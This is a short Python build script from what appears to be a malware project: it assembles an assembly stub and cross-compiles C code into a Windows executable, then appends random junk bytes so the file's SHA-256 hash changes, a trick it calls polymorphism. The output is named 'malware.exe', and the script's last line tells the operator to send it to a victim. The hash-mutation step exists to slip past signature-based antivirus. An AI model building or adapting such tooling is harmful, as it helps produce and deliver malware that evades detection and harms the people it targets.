import os
import subprocess
import random

from fr33d.tools.builder import get_sha256

print("[*] 1. Compiling code...")

# get absolute paths
script_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(script_dir, ".."))
code_dir = os.path.join(project_root, "src")
asm_dir = os.path.join(code_dir, "asm")
build_dir = os.path.join(project_root, "build")

os.makedirs(build_dir, exist_ok=True)

# output files saved in the project root/build
compiled_exe = os.path.join(project_root, "main.exe")
final_name = "malware.exe"
final_exe = os.path.join(build_dir, final_name)

assemble_cmd = [
    "nasm",
    "-f",
    "win64",
    os.path.join(asm_dir, "stub.asm"),
    "-o",
    os.path.join(asm_dir, "stub.obj")
]
subprocess.run(assemble_cmd, check=True)

compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    os.path.join(code_dir, "main.c"),
    os.path.join(asm_dir, "stub.obj"),
    "-o", compiled_exe,
    "-s"           # stripped flag
]

subprocess.run(compile_cmd, check=True)


base_hash = get_sha256(compiled_exe)
print(f"[+] Completed! Original Hash: {base_hash}")

print("\n[*] 2. Applying Polymorphism...")
with open(compiled_exe, "rb") as f:
    exe_content = f.read()

# generate 16 to 64 random bytes
junk_size = random.randint(16, 64)
junk_bytes = os.urandom(junk_size)

mutated_content = exe_content + junk_bytes

with open(final_exe, "wb") as f:
    f.write(mutated_content)

final_hash = get_sha256(final_exe)
print(f"[+] Compiled malware: {final_exe}")
print(f"[+] New SHA-256 Hash: {final_hash}")

# cleanup
os.remove(compiled_exe)
print(f"\n[+] Operation completed. Send '{final_name}' to victim!")